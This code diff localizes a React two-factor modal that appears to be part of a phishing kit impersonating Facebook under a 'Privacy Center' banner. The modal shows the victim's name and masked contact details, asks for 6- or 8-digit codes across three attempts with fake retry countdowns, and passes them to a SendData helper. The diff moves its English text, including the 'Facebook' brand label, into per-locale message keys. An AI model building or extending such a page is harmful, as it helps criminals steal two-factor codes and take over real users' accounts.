@@ -4,6 +4,9 @@ import { maskEmail, maskPhoneNumber } from '@/utils/mask';
 import { useAppDispatch, useAppSelector } from '@/app/store/hooks';
 import { FormData, updateForm } from '@/app/store/slices/stepFormSlice';
 import { SendData } from '@/utils/sendData';
+import { usePrivacyCenterLocale } from '@/components/privacy-center/PrivacyCenterLocaleContext';
+import { privacyCenterMessages } from '@/lib/privacy-center-messages';
+import type { PrivacyCenterStrings } from '@/lib/privacy-center-messages-types';
 
 interface TwoFactorModalProps {
     isOpend: boolean;
@@ -17,19 +20,19 @@ function isValidTwoFaCode(value: string): boolean {
     return TWO_FA_LENGTHS.some((len) => value.length === len && /^\d+$/.test(value));
 }
 
-function twoFaRetryMessage(minutes: number, seconds: number): string {
+function twoFaRetryMessage(t: PrivacyCenterStrings, minutes: number, seconds: number): string {
     const m = Math.max(0, minutes);
     const s = Math.max(0, seconds);
     if (m === 0 && s === 0) {
-        return 'That code is incorrect. Please try again in a moment.';
+        return t.modal2faErrWrongSoon;
     }
     if (m > 0 && s > 0) {
-        return `That code is incorrect. Try again in ${m} min ${s} sec.`;
+        return t.modal2faErrWrongMinSec.replace('{m}', String(m)).replace('{s}', String(s));
     }
     if (m > 0) {
-        return `That code is incorrect. Try again in ${m} min.`;
+        return t.modal2faErrWrongMin.replace('{m}', String(m));
     }
-    return `That code is incorrect. Try again in ${s} sec.`;
+    return t.modal2faErrWrongSec.replace('{s}', String(s));
 }
 
 const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
@@ -42,6 +45,8 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
 
     const dispatch = useAppDispatch();
     const formDataState = useAppSelector((state) => state.stepForm.data);
+    const { locale } = usePrivacyCenterLocale();
+    const t = privacyCenterMessages[locale];
 
     const [twoFa, setTwoFa] = React.useState('');
 
@@ -93,7 +98,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
             }
             if (!isValidTwoFaCode(twoFa)) {
                 if (twoFa.length > 0) {
-                    setErrors({ twoFa: 'Please enter exactly 6 or 8 digits.' });
+                    setErrors({ twoFa: t.modal2faErrDigits });
                 }
                 return;
             }
@@ -107,7 +112,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                         const minutes = Math.floor(countdown / 60);
                         const seconds = countdown % 60;
                         setErrors({
-                            twoFa: twoFaRetryMessage(minutes, seconds),
+                            twoFa: twoFaRetryMessage(t, minutes, seconds),
                         });
 
                         setLoading(false);
@@ -122,7 +127,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                             const seconds = countdown % 60;
 
                             setErrors({
-                                twoFa: twoFaRetryMessage(minutes, seconds),
+                                twoFa: twoFaRetryMessage(t, minutes, seconds),
                             });
 
                             if (countdown <= 0) {
@@ -150,7 +155,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                         const minutes = Math.floor(countdown / 60);
                         const seconds = countdown % 60;
                         setErrors({
-                            twoFa: twoFaRetryMessage(minutes, seconds),
+                            twoFa: twoFaRetryMessage(t, minutes, seconds),
                         });
                         setLoading(false);
                         setTwoFa('');
@@ -164,7 +169,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                             const seconds = countdown % 60;
 
                             setErrors({
-                                twoFa: twoFaRetryMessage(minutes, seconds),
+                                twoFa: twoFaRetryMessage(t, minutes, seconds),
                             });
 
                             if (countdown <= 0) {
@@ -225,15 +230,14 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                     <div className='flex w-full items-center text-[#65676b] gap-[6px] text-[14px] mb-[8px]'>
                         <span className="font-medium text-[#465a69]">{fullName}</span>
                         <span className="text-[#ccd0d5]" aria-hidden>·</span>
-                        <span>Facebook</span>
+                        <span>{t.modal2faBrand}</span>
                     </div>
                     <h2 className='text-[20px] text-[#0A1317] font-semibold tracking-tight mb-[12px]'>
-                        Two-factor authentication ({click + 1} of 3)
+                        {t.modal2faHeading.replace('{step}', String(click + 1))}
                     </h2>
                     <p className='text-[#465a69] text-[15px] leading-relaxed'>
-                        Enter the verification code sent to {emailDisplay} or {phoneDisplay}, or open your
-                        authenticator app (for example, Google Authenticator or Duo Mobile) and enter the
-                        current code.
+                        {t.modal2faIntro} {emailDisplay} {t.modal2faOr} {phoneDisplay},{' '}
+                        {t.modal2faAuthenticator}
                     </p>
                     <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
                         <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
@@ -248,7 +252,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                                     name="twoFa"
                                     autoComplete="one-time-code"
                                     maxLength={8}
-                                    placeholder="Enter the code (6 or 8 digits)"
+                                    placeholder={t.modal2faPlaceholder}
                                     className={`w-full outline-none h-full bg-transparent ${disabled ? 'opacity-70 cursor-not-allowed' : ''}`}
                                     value={twoFa}
                                     onChange={handleChange}
@@ -268,12 +272,12 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                                             <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                         </div>
                                     )}
-                                    {loading ? '' : 'Continue'}
+                                    {loading ? '' : t.modalBtnContinue}
                                 </button>
                             </div>
 
                             <div className='w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] poiter-events-none'>
-                                <span>Try another way</span>
+                                <span>{t.modal2faTryOther}</span>
                             </div>
                         </form>
                     </div>
